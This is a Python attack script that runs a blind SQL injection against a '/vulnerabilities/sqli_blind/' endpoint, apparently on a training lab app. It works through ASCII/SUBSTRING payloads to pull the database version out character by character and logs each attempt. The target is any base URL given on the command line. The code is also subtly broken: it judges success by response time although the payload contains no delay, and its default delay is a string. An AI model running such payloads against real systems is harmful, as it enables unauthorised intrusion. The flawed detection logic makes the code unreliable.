import requests
from datetime import datetime
from pathlib import Path
import sys
import json
import os
import time

# Configuração inicial
logs_dir = Path('logs')
logs_dir.mkdir(exist_ok=True)
session = requests.Session()

if len(sys.argv) > 2:
    base_url = sys.argv[1]
    request_rate = sys.argv[2]
else:
    print("Base URL was not provided.")
    sys.exit(1)

# Map request rate to a specific time interval
delays = {'low': 15, 'medium': 2, 'high': 0.5}
delay = delays.get(request_rate, 'medium')  # Default to 'medium' if rate is unrecognized

sqli_blind_url = f"{base_url}/vulnerabilities/sqli_blind/"

def blind_sql_injection_attack():
    total_tests = 0
    tests_passed = 0
    tests_failed = 0
    details = []
    version_number = ''
    version_length = 5  # Assumption of test version length

    for i in range(1, version_length + 1):
        found = False
        for ascii_code in range(32, 127):
            payload = f"' AND ASCII(SUBSTRING((SELECT version()), {i}, 1)) = {ascii_code}-- "
            start_time = time.time()
            response = session.get(sqli_blind_url, params={'id': payload})
            elapsed_time = time.time() - start_time
            total_tests += 1

            # Assumes a response time greater than 2 seconds is a successful test
            if elapsed_time > 2:
                version_number += chr(ascii_code)
                tests_passed += 1
                found = True
                details.append({
                    "position": i,
                    "character": chr(ascii_code),
                    "payload": payload,
                    "elapsed_time": elapsed_time,
                    "status_code": response.status_code,
                    "result": "PASSED"
                })
                print(f"Character found: {chr(ascii_code)} at position {i}")
                break
            else:
                tests_failed += 1
                details.append({
                    "position": i,
                    "character": chr(ascii_code),
                    "payload": payload,
                    "elapsed_time": elapsed_time,
                    "status_code": response.status_code,
                    "result": "FAILED"
                })
            time.sleep(delay)
        
        if not found:
            print(f"No character found at position {i}, stopping.")
            break

    # Log dos resultados
    script_name = os.path.splitext(os.path.basename(__file__))[0]
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    file_name = f"results_{script_name}_{timestamp}.json"
    results_file = logs_dir / file_name
    result_summary = {
        'date_time': timestamp,
        'base_url': base_url,
        'total_tests': total_tests,
        'tests_passed': tests_passed,
        'tests_failed': tests_failed,
        'tested_url': sqli_blind_url,
        'details': details
    }
    with open(results_file, 'w') as f:
        json.dump(result_summary, f, indent=4)
    print(f"Results saved to {results_file}")

if __name__ == "__main__":
    blind_sql_injection_attack()